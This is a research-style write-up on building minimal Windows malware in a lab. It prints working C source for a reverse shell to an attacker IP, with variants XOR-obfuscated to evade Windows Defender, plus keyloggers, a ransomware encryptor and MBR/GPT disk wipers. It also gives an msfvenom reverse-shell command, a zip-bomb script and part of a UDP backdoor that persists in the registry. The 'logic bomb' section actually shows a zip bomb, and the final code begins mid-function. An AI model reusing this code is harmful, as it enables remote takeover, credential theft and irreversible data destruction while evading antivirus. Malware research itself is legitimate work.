﻿
# A Comparative Study on Malware Types and Data Persistence Strategy

## Abstract

This document presents an experimental study into the development, execution, and analysis of various types of minimalistic malware targeting Windows 10 systems. Each malware type is evaluated for size, detection rate, impact, and storage location stealth. The experiments are conducted in a fully controlled and air-gapped lab environment with proper legal clearances for cybersecurity research.

The study is divided into two main phases:

1.  **Minimal Malware Implementation**: Identify and develop the smallest possible malware sample for each category (e.g., Reverse Shell, LSASS Dumper, Keylogger, etc.). Each sample is evaluated for minimal size, functionality, and stealth.
    
2.  **Persistence Mechanism Testing**: Investigate various persistence methods (e.g., Registry, Kernel Memory, Heap Memory) to determine their ease of use, stealth level, and required privileges (e.g., Administrator access). Each method is tested for feasibility, detectability, and prerequisites.
    

## Lab Environment

-   **Target Machine**: Windows 10 Pro, Version 21H2, 64-bit
    
-   **Development Machine**: Arch Linux LTS
    
-   **Virtualization**: VirtualBox 7.0.14
    
-   **Network**: Host-only, air-gapped
    
-   **Attack Tools**: Netcat, GCC (MinGW), msfvenom, custom C/C++/Assembly code
    
-   **AV/EDR**: Windows Defender (active), ClamAV(scanner)
    

## Malware Types and Experimental Sections

### 1. Reverse Shell

**Description**: Establishes a reverse connection from the victim to the attacker, providing remote shell access.

A **reverse shell** is a type of shell where the target machine (victim) initiates the connection back to the attacker's system. This is useful to bypass firewall rules and NAT configurations that would block inbound connections (which bind shells depend on).

In contrast, a **bind shell** listens for incoming connections on the victim's machine, requiring the attacker to connect to it. Bind shells are easier to detect and block because the target machine opens a listening port.

|Property | Reverse Shell | Bind Shell |
| --|--|--|
|Initiator| Victim machine (target) | Attacker machine
|Firewall Bypass | Easier (outbound allowed) | Harder (inbound blocked)
|Detection Risk | Lower (stealthier) | Higher (open port visible)
|Usage in Modern Malware | Very common | Rarely used due to firewalls



Reverse shells are the preferred method in modern attacks for their stealth and firewall bypass capabilities.

**Common Reverse Shell Providers:**

-   **msfvenom (part of Metasploit Framework)**:  msfvenom payload generator application made by Rapid7, first released in the mid-2000s. Frequently used for generating staged or stageless reverse shell payloads in various formats (EXE, DLL, etc.).
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_shell.exe
``` 



    
-   **Meterpreter**: A Metasploit payload offering advanced functionality like file transfers, process migration, and in-memory execution. Introduced as part of Metasploit in 2004 and built in C by Matt Miller.
    
-   **Custom C/C++ Shells**: Minimal and highly customizable; can be compiled with MinGW or Visual Studio for Windows targets.
    
-   **Netcat**: A classic tool supporting reverse shells via simple TCP connections; popular since the 1990s.
    

**Experimental Test Code**:

```c
// Test 1- Reverse shell in C
#include <winsock2.h> //The socket lib
#include <windows.h> //WinAPI for starting cmd

#pragma comment(lib, "ws2_32.lib") //Linking winsock

int main() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsa); //Starts Winsocket
    s = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
//Socket now ready on s.
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("192.168.1.10"); // attacker IP
    server.sin_port = htons(4444);                      // attacker Port

    connect(s, (struct sockaddr *)&server, sizeof(server));

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) s;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}

```

-   **Size**: 144K
    
-   **Detection**: Detected by Windows Defender
-   **Virustotal Hash**:
d14e2af858283a3eddfb38db7ac962690cb324cad5d394716c053ed613510f6a
-   **Required Privileges**: None

On further investigation, it was found that this was due to exposed IP and a direct create process call for the command line.
There also is the issue of the command line being visible on the victim machine.

Knowing this, a better version of the reverse shell was iterated on, using obfuscation to make it look like a legitimate "network parser" and XOR-keying most flaggable strings.
**VirusTotal Hash**:9241ac53470acb73df60fa3de01ee4d662714e8dd7b1cab94e32f27d82c78add

```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define CONFIG_KEY 0xAA

unsigned char normalize_byte(unsigned char val) {
    return val ^ CONFIG_KEY;
}

unsigned char process_checksum(unsigned char val) {
    return (val ^ 0xFF) ^ (0xFF ^ CONFIG_KEY); // Identifies checksum for further use
}
unsigned long resolve_server_address(unsigned char *data_stream) {
    unsigned char network_buffer[4];
    for (int idx = 0; idx < 4; idx++) {
        network_buffer[idx] = normalize_byte(data_stream[idx]);
    }
    unsigned long server_ip;
    memcpy(&server_ip, network_buffer, 4);
    return server_ip;
}

void fetch_command_line(char *output_buffer) {
    int config_payload[] = {99, 109, 100, 46, 101, 120, 101, 0}; //
    for (int i = 0; i < 8; i++) {
        output_buffer[i] = (char)config_payload[i]; // reconstruct string at runtime
    }
}

int main() {
    WSADATA socket_context;
    SOCKET session_handle;
    struct sockaddr_in connection_profile;
    STARTUPINFO execution_config;
    PROCESS_INFORMATION task_handler;

    unsigned char remote_host[] = {192 ^ CONFIG_KEY, 168 ^ CONFIG_KEY, 56 ^ CONFIG_KEY, 1 ^ CONFIG_KEY};
    unsigned char temp_storage = 0x00; // unused, harmless looking var

    for (int i = 0; i < 4; i++) {
        remote_host[i] = process_checksum(remote_host[i]);
        temp_storage ^= remote_host[i];
    }

    WSAStartup(MAKEWORD(2,2), &socket_context);
    session_handle = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

    connection_profile.sin_family = AF_INET;
    connection_profile.sin_port = htons(4444);
    connection_profile.sin_addr.s_addr = resolve_server_address(remote_host);

    if (connect(session_handle, (struct sockaddr *)&connection_profile, sizeof(connection_profile)) != 0) {
        printf("Socket connection error: %d\n", WSAGetLastError());
        return 1;
    }

    char exec_buffer[8];
    fetch_command_line(exec_buffer); // reconstruct 'cmd.exe' string

    memset(&execution_config, 0, sizeof(execution_config));
    execution_config.cb = sizeof(execution_config);
    execution_config.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    execution_config.wShowWindow = SW_HIDE;
    execution_config.hStdInput = execution_config.hStdOutput = execution_config.hStdError = (HANDLE) session_handle;

    CreateProcess(NULL, exec_buffer, NULL, NULL, TRUE, 0, NULL, NULL, &execution_config, &task_handler);

    return 0;
  }
```  

The size was found to be 148K, but neither ClamAV nor Windows Defender could flag the reverse shell.
However, the high entropy and many junk calls resulted in more VirusTotal matches. Therefore, the code is once again simplified.
**VirusTotal Hash**: 5318a4d5390a10df71f2bf51e4efc4e48d6230529bb03d5ee0df99d73cd369e4
```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
#define XOR_KEY 0xAF


int main(int argc, char *argv[])
{
  WSADATA wsa;
  SOCKET s;
  struct sockaddr_in server;
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  WSAStartup(MAKEWORD(2,2), &wsa);
  unsigned char encpt[] = {192 ^ XOR_KEY, 168 ^ XOR_KEY, 56 ^ XOR_KEY, 1 ^ XOR_KEY};
  unsigned char adr[4];
  for (int i = 0; i < 4; i++ ) {
    adr[i] = encpt[i] ^ XOR_KEY;
  }

  int nums[] = {99,109, 100, 46, 101, 120, 101, 0};
  char com[8];
  for (int i = 0; i < 8; i++) {
    com[i] = (char)nums[i];
  }

  s = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = *(unsigned long*)adr;
  server.sin_port = htons(4444);

  connect(s,  (struct sockaddr*)&server, sizeof(server));
  if (connect(s, (struct sockaddr *)&server, sizeof(server)) != 0) {
    printf("Connection failed: %d\n", WSAGetLastError());
    return 1;
  }

  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) s;

  CreateProcess(NULL, com, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

  return 0;
}
```
Possible future improvements include using a stub to load it into memory directly to constitute fileless malware, launch the command prompt as a Trusted Service, or to add a method to craft the TCP packets used by the shell into HTTP packets using Gecko or as ICMP packets.

Another point to note is that this shell is still a user-level access shell. Privilege must be escalated to attain root level access. Integrating an PrivEsc tool may be a future upgrade.





### 2. Keylogger

**Description**:  
A keylogger is a type of malware designed to monitor and record every keystroke made by a user on an infected system. Its primary purpose is to capture sensitive data such as login credentials, financial information, personal messages, and proprietary data. 

Keyloggers operate by intercepting keyboard input through various means. The most common approaches are:

1. **Polling-Based Keylogger**:  
   Continuously queries the state of each key using functions like `GetAsyncKeyState()` or `GetKeyState()`.  
   - **Advantages**: Simple, portable.  
   - **Disadvantages**: High CPU usage, easier to detect by behavioral monitoring.

2. **Hook-Based Keylogger**:  
   Uses `SetWindowsHookEx()` to insert itself into the system's input stream, allowing interception of every keystroke processed by the OS message queue.  
   - **Advantages**: Stealthier, lower CPU load.  
   - **Disadvantages**: Requires more complex API use, may need elevated privileges depending on scope.

3. **Kernel-Level Keylogger** (Advanced):  
   Installed as a driver, capturing keystrokes directly at the OS kernel level before they reach user-mode processes.  
   - **Advantages**: Very stealthy, bypasses many AV/EDR protections.  
   - **Disadvantages**: Requires Administrator (or SYSTEM) privileges, risk of system instability.

---

**Common Detection Avoidance Techniques**:

- Obfuscation of keylogging functions.
- Logging only in specific contexts (e.g., browser windows or password fields).
- Data encryption before local storage or C2 transmission.
- Usage of fileless techniques (storing logs in memory or registry).

---

**Historical Examples of Keyloggers**:

| Malware Name       | Year | Type                | Notable Target/Impact                          |
|-------------------|------|--------------------|------------------------------------------------|
| **KeyBase**       | 2009 | Hook-based         | Used to steal online banking credentials globally. |
| **Hesperbot**     | 2013 | Hook + form grabbing | Targeted online banking in Europe, deployed via phishing. |
| **DarkComet RAT** | 2012 | Hook-based + RAT   | Widely used for surveillance, including in state espionage. |
| **Agent Tesla**   | 2014 | Hook-based + Exfil | Keylogging component as part of full malware suite, sold in underground forums. |

---

| Property               | Details                                      |
|-----------------------|---------------------------------------------|
| Size                  | 10-50 KB (depending on complexity)           |
| Detection             | Moderate to High (especially in userland)    |
| Required Privileges   | User (Kernel-level requires Admin)           |
| Stealth Potential     | High (especially for hook or kernel versions)|
| Persistence Options   | Registry autorun, startup folder, scheduled task, DLL injection |

---

**Experiment Details**:
As an early test setup, we tested a polling based keylogger, recording high level keystrokes. This worked moderately well, having a very basic overview of all keys pressed. But it had large amounts of artifacting, due to reading keys like Shift, Del and the Function keys as ASCII. 

```c
#include <windows.h>
#include <stdio.h>

int main() {
    FILE *file;
    char key;
    short keyState[256] = {0};  
    file = fopen("log.txt", "a+");

    while (1) {
        Sleep(10);

        for (key = 8; key <= 190; key++) {
            SHORT keyPress = GetAsyncKeyState(key);

            if ((keyPress & 0x8000) && !keyState[key]) {
                fprintf(file, "%c", key);
                fflush(file);
                keyState[key] = 1; 
            }
            else if (!(keyPress & 0x8000) && keyState[key]) {
                keyState[key] = 0; // Mark key as released
            }
        }
    }

    fclose(file);
    return 0;
}
```


Therefore, we worked on a more advanced hook based system, reading Windows Keystroke events, which worked with great accuracy and was not detected by Windows Defender and ClamAV.
```c
#include <windows.h>
#include <stdio.h>

HHOOK keyboardHook;
FILE *logFile;

LRESULT CALLBACK KeyLogger(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            DWORD key = pKey->vkCode;
            logFile = fopen("keylog.txt", "a+");
            if (logFile != NULL) {
                fprintf(logFile, "%c", key);
                fclose(logFile);
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    MSG message;

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLogger, NULL, 0);
    if (keyboardHook == NULL) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
        return 1;
    }

    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
```
Both keyloggers were not detected by Windows Defender and ClamAV.
Future improvements can fix the rate glitches spasming out and pasting a simple key multiple times, as well as more *context-aware* copying, for example, focusing on popup windows, email ids and password boxes.



### 3. Credential Stealer (LSASS Dumper)
**Description**:  
A Credential Stealer (LSASS Dumper) is malware that targets the Local Security Authority Subsystem Service (`lsass.exe`) to extract sensitive authentication information stored in memory. LSASS holds cached credentials such as plaintext passwords, NTLM hashes, and Kerberos tickets that are critical for authentication in Windows environments. By dumping LSASS’s process memory, attackers can harvest these secrets and use them for privilege escalation or lateral movement within a network.

**Technical Approach**:

1. **LSASS Process Dumping**:  
   The malware attaches to the `lsass.exe` process (PID obtained via `OpenProcess`) and performs a memory dump using tools like `MiniDumpWriteDump`. This dump can later be analyzed offline with tools such as **Mimikatz** to extract credentials.

2. **Direct Memory Reading (Advanced)**:  
   Reads LSASS memory live via `ReadProcessMemory` for stealthier in-memory extraction, avoiding dump files that may trigger antivirus or logging tools.

3. **Malicious DLL Injection**:  
   Injects code into LSASS to extract secrets without dumping the entire process to disk (fileless technique).

---

**Common Detection Avoidance Techniques**:

- Using **signed drivers** or kernel exploits to access LSASS without elevated detection.
- Process hollowing or **reflective DLL injection** into LSASS.
- Disabling or bypassing **Credential Guards**.
- Fileless operation to avoid creation of detectable dump files.

---

**Historical Examples of LSASS Dumping**:

| Malware/Tool Name | Year | Technique              | Notable Target/Impact                          |
|------------------|------|-----------------------|------------------------------------------------|
| **Mimikatz**     | 2011 | LSASS Dump + Memory Parse | Used globally for post-exploitation credential theft. |
| **Cobalt Strike Beacon** | 2015 | Reflective Injection | Widely used in red team operations and real attacks. |
| **L0phtCrack**   | 1997 | NTLM Hash Extraction   | One of the earliest password cracking tools for Windows. |
| **TrickBot**     | 2016 | LSASS ReadProcessMemory | Used by banking Trojans and Ryuk ransomware campaigns. |

---

| Property               | Details                                      |
|-----------------------|---------------------------------------------|
| Size                  | 50–200 KB (depending on method and obfuscation) |
| Detection             | High (AV/EDR monitor LSASS access aggressively) |
| Required Privileges   | Administrator or SYSTEM                      |
| Stealth Potential     | Medium (depends on technique used)           |
| Persistence Options   | Typically none — post-exploitation payload   |

---

**Experiment Details**:
to be done.



### 4. Ransomware

**Description**:  
Ransomware is a class of malware designed to encrypt the victim’s files or lock access to the entire system, rendering data inaccessible until a ransom is paid — usually in cryptocurrency. Unlike wipers, ransomware typically offers a means of data recovery (via decryption keys) after the ransom is paid, although this promise is not always followed through as is the case with Petya.

The two main categories of ransomware are:

1. **File-Encrypting Ransomware**:  
   - Locates files by traversing directories.
   - Encrypts files using symmetric (AES) or hybrid (AES + RSA) cryptography.
   - Deletes local backup copies to prevent easy recovery.
   
2. **Locker Ransomware**:  
   - Blocks access to the system through fullscreen window, bootloader modification, or similar methods.
   - Rare in modern strikes due to lower effectiveness.

---

**Common Behavior Patterns**:

- Uses strong encryption algorithms (AES-256, RSA-2048).
- Appends specific extensions to encrypted files (e.g., `.locked`, `.crypted`).
- Drops ransom notes (e.g., `README.txt`) with payment instructions.
- Deletes system recovery options (`vssadmin delete shadows`).
- Attempt lateral movement to infect shared network drives.

---

**Advanced Features:**:

- **Double Extortion**: Data exfiltrated before encryption.
- **Process Hollowing**: Inject payload into trusted processes to prevent detection by EDR/AV.
- **Obfuscation and Packing**: To prevent static analysis and attempted decryption.

---

**Historical Examples of Ransomware**:

| Malware Name      | Year | Technique              | Notable Target/Impact                        |
|------------------|------|-----------------------|---------------------------------------------|
| **WannaCry**     | 2017 | SMB Exploit + AES Encryption | Global disruption across NHS, FedEx, Renault. |
| **Locky**        | 2016 | Email attachment dropper | Major infection vector via Office macros.   |
| **Ryuk**         | 2018 | Manual lateral deployment | Targeted enterprises; ransom demands $300K+. |
| **Conti**        | 2020 | Double extortion + encryption | Data theft and ransomware combined; hit Irish Health Service. |

---

| Property               | Details                                      |
|-----------------------|---------------------------------------------|
| Size                  | 100 KB – 500 KB (varies with obfuscation)    |
| Detection             | High (modifies large number of files quickly)|
| Required Privileges   | User (Admin for max damage, e.g., deleting backups) |
| Stealth Potential     | Low (destructive and noisy by design)        |
| Persistence Options   | Optional — sometimes deletes itself after execution |

---

**Experiment Details**:
A simple XOR encryption was used to make the file in the documents unreadable, as well as a renaming of the file extention to ".encrypted" to prevent any accidental execution. It requires userland permissions, and is not detected by Windows Defender or ClamAV.
```c
#include <windows.h>
#include <stdio.h>

#define XOR_KEY 0xAA 

void XorEncryptFile(const char *filePath) {
    printf("Encrypting: %s\n", filePath);

    FILE *file = fopen(filePath, "rb+");
    if (file == NULL) {
        printf("Failed to open: %s\n", filePath);
        return;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    if (size <= 0) {
        printf("File size error or empty: %ld bytes\n", size);
        fclose(file);
        return;
    }

    char *data = (char *)malloc(size);
    if (!data) {
        printf("Memory allocation failed.\n");
        fclose(file);
        return;
    }

    size_t readBytes = fread(data, 1, size, file);
    if (readBytes != size) {
        printf("fread failed: read %zu bytes instead of %ld\n", readBytes, size);
        free(data);
        fclose(file);
        return;
    }

    // XOR encrypt the file content
    for (long i = 0; i < size; i++) {
        data[i] ^= XOR_KEY;
    }

    rewind(file);
    size_t written = fwrite(data, 1, size, file);
    fflush(file);
    fclose(file);
    free(data);

    if (written != size) {
        printf("fwrite failed: wrote %zu bytes instead of %ld\n", written, size);
    } else {
        printf("Encryption done: %s\n", filePath);
    }

    // Rename file to .encrypted
    char newPath[MAX_PATH];
    snprintf(newPath, MAX_PATH, "%s.encrypted", filePath);
    if (!MoveFile(filePath, newPath)) {
        printf("MoveFile failed: error %lu\n", GetLastError());
    } else {
        printf("Renamed to: %s\n", newPath);
    }
}

void EncryptFolder(const char *folderPath) {
    WIN32_FIND_DATA findFileData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", folderPath);

    HANDLE hFind = FindFirstFile(searchPath, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("FindFirstFile failed.\n");
        return;
    }

    do {
        if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            char filePath[MAX_PATH];
            snprintf(filePath, MAX_PATH, "%s\\%s", folderPath, findFileData.cFileName);
            XorEncryptFile(filePath);
        }
    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char *targetFolder = "C:\\Users\\testing\\Documents";

    EncryptFolder(targetFolder);

    MessageBox(NULL, "Your files have been encrypted!", "Ransomware Demo", MB_OK | MB_ICONWARNING);
    return 0;
}
```

Future modific

### 5. Destructive Malware (Wiper)

**Description**: Wiper malware constitutes a class of malicious software specifically designed to render data or entire systems permanently unusable. Unlike ransomware, whose operational model is predicated on data recovery post-payment, wipers are developed to cause irreversible damage, with no provision for remediation. Their purpose is often strategic sabotage, destruction of critical data, or disruption of operational infrastructure.

Wiper malware operates at various levels of system abstraction:

1. **File System Level**  
   - Deletes, renames, or corrupts files and directories.  
   - Overwrites file system metadata structures (e.g., NTFS Master File Table, ext4 Superblock).  
   - Multiple overwrites with garbage data result in unrecoverable data.

2. **Disk Structure Level (MBR/GPT)**  
   - Overwrites the Master Boot Record (MBR) or GUID Partition Table (GPT), preventing the detection of the existing OS and fails boot.
   - Common in destructive malware to disable the OS without actually attacking the filesystem.

3. **Raw Disk Access**  
   - Opens physical disk handles (e.g., `\\.\PhysicalDrive0` on Windows, `/dev/sda` on Linux) to perform direct sector-level overwrites.  
   - Bypasses file system protections to destroy data regardless of file-level permissions.

4. **Firmware Level (Advanced)**  
   - Targets SSD controllers, BIOS, or UEFI firmware to damage hardware-level storage management or permanently brick devices.  
   - Extremely rare, highly difficult, and only has been done by state-sponsored operations.

---

### Typical Behaviors

- Overwriting disk sectors with zeroes or random patterns.
- Corrupting bootloaders (MBR/EFI) to cause boot failure.
- Wiping partition tables, rendering storage devices uninitialized.
- Disabling system recovery mechanisms such as Shadow Copies and System Restore.
- Inducing forced reboots after corruption to ensure execution of destructive payloads.

---

### Notable Historical Examples

| Malware Name | Year | Primary Technique | Notable Target/Impact |
|-------------|------|------------------|----------------------|
| **CIH/Chernobyl Virus** | 1998 | MBR & BIOS overwrite | Rendered devices permanently unbootable; required hardware repair. |
| **Shamoon** | 2012, 2016 | MBR & file overwrite | Saudi Aramco; over 30,000 systems disabled. |
| **KillDisk** | 2015 | File system & MBR overwrite | Ukrainian energy sector disruption. |
| **Petya/NotPetya** | 2016, 2017 | MBR overwrite, disk encryption (wiper disguised as ransomware) | Ukrainian government, global corporations; mass disruption. |
| **BlackEnergy 3** | 2015 | Disk and data destruction | Ukraine power grid; contributed to major blackout. |

---

**Experiment Details**:
We use the Windows API again, this time using raw disk access to forcefully rewrite the first 512 bytes of the disk, which is usually the MBR Partition Table location. The code is written in C and given below.
The 
**VirusTotal Hash:** 4dd5526284af302b4f537a7f819985fc2d77491e166fdf9bbc7f372c6fb5a831

```c
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE diskHandle = CreateFile(
        "\\\\.\\PhysicalDrive0",            
        GENERIC_WRITE,                      
        FILE_SHARE_READ | FILE_SHARE_WRITE, 
        NULL,
        OPEN_EXISTING,                      
        0,
        NULL
    );

    if (diskHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open disk. Error: %lu\n", GetLastError());
        return 1;
    }

    BYTE mbrData[512] = {0}; 
    DWORD bytesWritten;

    BOOL result = WriteFile(
        diskHandle,    
        mbrData,      
        512,          
        &bytesWritten,
        NULL
    );

    if (!result) {
        printf("Failed to write MBR. Error: %lu\n", GetLastError());
        CloseHandle(diskHandle);
        return 1;
    }

    printf("MBR overwritten successfully. %lu bytes written.\n", bytesWritten);
    CloseHandle(diskHandle);
    return 0;
}
```

On testing in a Windows 10 VM, we see that the malware works as expected, destroying the table and making the OS unbootable, but it needs admin privileges. The file was not detected by Windows Defender or ClamAV.
However, we can make this more effective by accurately targeting key strike positions on top of random rewrites of the storage medium to make it more effective. The experimental code is given below and is awaiting testing.
```c
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>

#define TARGET_DISK "\\\\.\\PhysicalDrive0" 
#define SECTOR_SIZE 512
#define RANDOM_TARGETS 5 
#define GPT_HEADER_PRIMARY_LBA 1

void overwrite_sector(HANDLE disk, DWORD64 lba, BYTE pattern) {
    DWORD written;
    LARGE_INTEGER pos;
    BYTE buffer[SECTOR_SIZE];
    memset(buffer, pattern, SECTOR_SIZE);

    pos.QuadPart = lba * SECTOR_SIZE;
    SetFilePointerEx(disk, pos, NULL, FILE_BEGIN);
    WriteFile(disk, buffer, SECTOR_SIZE, &written, NULL);
}

int main() {
    HANDLE disk = CreateFileA(
        TARGET_DISK,
        GENERIC_WRITE | GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (disk == INVALID_HANDLE_VALUE) {
        printf("Failed to open disk: %lu\n", GetLastError());
        return 1;
    }

    DISK_GEOMETRY_EX geom;
    DWORD bytesReturned;

    if (!DeviceIoControl(
        disk,
        IOCTL_DISK_GET_DRIVE_GEOMETRY_EX,
        NULL,
        0,
        &geom,
        sizeof(geom),
        &bytesReturned,
        NULL
    )) {
        printf("Failed to get disk geometry: %lu\n", GetLastError());
        CloseHandle(disk);
        return 1;
    }

    ULONGLONG diskSize = geom.DiskSize.QuadPart;
    ULONGLONG totalSectors = diskSize / SECTOR_SIZE;
    printf("Disk size: %llu bytes (%llu sectors)\n", diskSize, totalSectors);

    printf("Overwriting MBR...\n");
    overwrite_sector(disk, 0, 0x00);

    printf("Overwriting Primary GPT Header...\n");
    overwrite_sector(disk, GPT_HEADER_PRIMARY_LBA, 0xFF);

    printf("Overwriting Backup GPT Header...\n");
    ULONGLONG backupGPTLBA = totalSectors - 1;
    overwrite_sector(disk, backupGPTLBA, 0xFF);

    printf("Overwriting possible NTFS MFT region...\n");
    ULONGLONG mftLBA = 786432;
    if (mftLBA < totalSectors) {
        overwrite_sector(disk, mftLBA, 0xAA);
    }

    printf("Overwriting random sectors...\n");
    for (int i = 0; i < RANDOM_TARGETS; i++) {
        DWORD64 randomLBA = (rand() % (totalSectors - 1000)) + 1000; 
        printf("Overwriting random LBA: %llu\n", randomLBA);
        overwrite_sector(disk, randomLBA, 0xCC);
    }

    CloseHandle(disk);
    printf("Disk wipe completed.\n");
    return 0;
}
```

### 6. Logic Bomb

**Description**:  
A Logic Bomb is a form of malware that remains dormant within a system until triggered by a specific event or condition. Unlike continuously running malware (like keyloggers or worms), logic bombs only execute their payload when predefined criteria are satisfied — for example, a certain date/time, the presence of a specific file, user login, or even the execution of particular software.

Logic Bombs are often embedded inside seemingly legitimate programs or files, making detection difficult through traditional scanning methods. When the trigger condition is met, the bomb "detonates," executing its malicious payload — which may include data deletion, system corruption, or activation of another malware component (such as ransomware or wipers).

---

**Trigger Mechanisms**:

- **Date/Time-based**: Activated on a specific calendar day or time (e.g., “April 1st attacks”).
- **File/Program Presence**: Triggers if a specific file is missing, modified, or created.
- **User Action**: Executes when a certain user logs in or runs a particular application.
- **System State**: Detects specific processes, services, or environment variables before activating.

---

**Common Logic Bomb Payloads**:

- Deletion or corruption of critical files.
- Launching ransomware or wipers.
- Disabling security software or altering system configurations.
- Displaying unauthorized messages or system alerts.
- Opening network backdoors or enabling remote access components.

**Advanced features**:  
- Embedding within larger benign applications.
- Use of obfuscated or encrypted trigger logic.
- Multiple trigger conditions (AND/OR chaining).


---

**Historical Examples of Logic Bombs**:

| Malware Name                      | Year | Technique               | Notable Target/Impact                                  |
|----------------------------------|------|------------------------|-------------------------------------------------------|
| **Omega Engineering Logic Bomb** | 1996 | Time-based trigger      | Disgruntled employee caused $10 million in damages to manufacturing equipment. |
| **Siemens Sabotage Incident**    | 2000 | Event-based trigger     | Insider planted code that disabled factory systems after his departure. |
| **CIH/Chernobyl Virus**          | 1998 | Date-based trigger (April 26) | Damaged BIOS chips and hard drives on trigger date.     |

---

| Property               | Details                                          |
|-----------------------|--------------------------------------------------|
| Size                  | 4 – 15 KB (simple triggers)                       |
| Detection             | Low (hidden until condition met)                  |
| Required Privileges   | User (Admin if destructive payload involved)      |
| Stealth Potential     | Very High until detonation                        |
| Persistence Options   | Embedded in legitimate software or scripts        |

---


**Special Note**:  
Logic Bombs are historically linked to **insider threats**, where disgruntled employees insert malicious code into enterprise software (e.g., Omega Engineering incident). Such bombs may remain dormant for years, activating only when specific corporate events occur (like system decommissioning or employee termination).

**Experiment Details**:
We use a highly compressible string with large amounts of repetition(low entropy) for the zip to be highly effective. However, on testing, we see that no noticeable performance drop occurs during unzipping, and the only damage done is the blotting of storage data. No detection by both ClamAV and Windows Defender. 
```c
mkdir bomb_dir
for i in {1..500000}; do
    yes "AAAAAAAAAAAAAAAA" | head -c 4294967296 > bomb_dir/file_$i.txt  # 4GB each file
done
zip -r bomb.zip bomb_dir
```

## Final Project: UDP Packet Based Remote System Access Software

**Code**:
```c
        RegCloseKey(hKey);
    }
}

DWORD read_chunk(const char* name, BYTE* out) {
    DWORD size = CHUNK_SIZE;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_BASE_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, name, NULL, NULL, out, &size) != ERROR_SUCCESS) {
            size = 0;
        }
        RegCloseKey(hKey);
    } else {
        size = 0;
    }
    if (size > 0) xor_buffer(out, size);
    return size;
}

void rebuild_file() {
    FILE *fp = fopen(FILE_OUT, "wb");
    if (!fp) return;

    BYTE buffer[CHUNK_SIZE];
    char key[32];
    DWORD len;

    for (int i = 0; i < MAX_CHUNKS; i++) {
        snprintf(key, sizeof(key), "chunk_%03d", i);
        len = read_chunk(key, buffer);
        if (len == 0) break;
        fwrite(buffer, 1, len, fp);
    }
    fclose(fp);
}

void clear_registry_chunks() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_BASE_KEY, 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
        return;

    char name[256];
    DWORD nameLen = sizeof(name);
    while (RegEnumValueA(hKey, 0, name, &nameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, name);
        nameLen = sizeof(name);
    }
    RegCloseKey(hKey);
}

void handle_command(SOCKET sock, char* buffer, int len, struct sockaddr_in* client_addr, int client_len) {

    buffer[len] = '\0';
    
    if (strncmp(buffer, "rebuild", 7) == 0) {
        rebuild_file();
        sendto(sock, "[+] File rebuilt", 16, 0, (struct sockaddr*)client_addr, client_len);
    }
    else if (strncmp(buffer, "clear", 5) == 0) {
        clear_registry_chunks();
        sendto(sock, "[+] Registry cleared", 20, 0, (struct sockaddr*)client_addr, client_len);
    }
    else if (strncmp(buffer, "run", 3) == 0) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        CreateProcessA(FILE_OUT, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        sendto(sock, "[+] Executing file", 18, 0, (struct sockaddr*)client_addr, client_len);
    }
    else if (strncmp(buffer, "exit", 4) == 0) {
        sendto(sock, "[+] Exiting", 11, 0, (struct sockaddr*)client_addr, client_len);
        exit(0);
    }
    else if (strncmp(buffer, "chunk:", 6) == 0) {
        // Format is chunk:<index>:<data>
        char* index_str = buffer + 6;
